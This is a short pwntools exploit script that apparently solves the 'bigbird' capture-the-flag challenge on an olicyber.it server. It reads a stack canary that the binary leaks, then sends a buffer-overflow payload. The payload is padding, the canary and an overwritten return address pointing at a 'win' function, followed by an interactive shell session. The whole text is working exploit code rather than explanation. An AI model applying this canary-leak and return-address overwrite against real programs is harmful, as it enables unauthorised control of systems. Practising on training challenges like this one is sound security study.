from pwn import *

elf = context.binary = ELF('./bigbird')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("bigbird.challs.olicyber.it", 12006)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c
    b initialize
    c
    b win
    ''')
else:
    conn = elf.process()
conn.recvuntil("BIRD: ")
canary = conn.recvline().decode().strip()
print(canary)
conn.sendline(b'A'*40+p64(int(canary, 16)) +b'A'*8+p64(0x401715))
conn.interactive()